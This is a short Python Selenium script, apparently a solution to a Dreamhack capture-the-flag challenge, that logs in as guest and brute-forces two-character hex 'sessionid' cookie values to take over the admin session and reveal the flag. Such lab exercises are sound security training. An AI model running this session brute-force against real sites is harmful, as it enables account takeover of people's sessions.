import time
from selenium import webdriver
import itertools
from selenium.webdriver.common.by import By
import requests
driver = webdriver.Chrome()
driver.implicitly_wait(3)

# 2자리 16진수 조합
alphabet = "0123456789abcdef"
pw = list(map(''.join, itertools.permutations(alphabet, 2)))

# 드리햄 로그인 창 접속
driver.get('http://host1.dreamhack.games:16604/login')
time.sleep(1)


# driver.find_element(By.NAME, "username").clear()

# ID : guest 입력
driver.find_element(By.NAME, "username").send_keys('guest')
# pw : guest 입력
driver.find_element(By.NAME, "password").send_keys('guest')

# 로그인 버튼 클릭
driver.find_element(By.XPATH, """/html/body/div/form/button""").click()


for i in pw:
    # 세션키에 하나씩 무작위 대입
    driver.add_cookie ({'name' : 'sessionid', 'value' : f'{i}'})

    # 새로고침
    driver.refresh()

    # admin 으로 로그인됐나 확인
    # body > div 태그내에 모든 텍스트 출력
    # admin 로그인 성공시 : Welcome Hello admin ~ flag ~
    # guest 로그인 성공시 : Welcome Hello guest ~
    # 실패시 : Welcome
    string1 = driver.find_elements(By.CSS_SELECTOR, "body > div")
    for j in string1:
        print(j.text)
    print (driver.get_cookie ('sessionid'))


time.sleep(1)



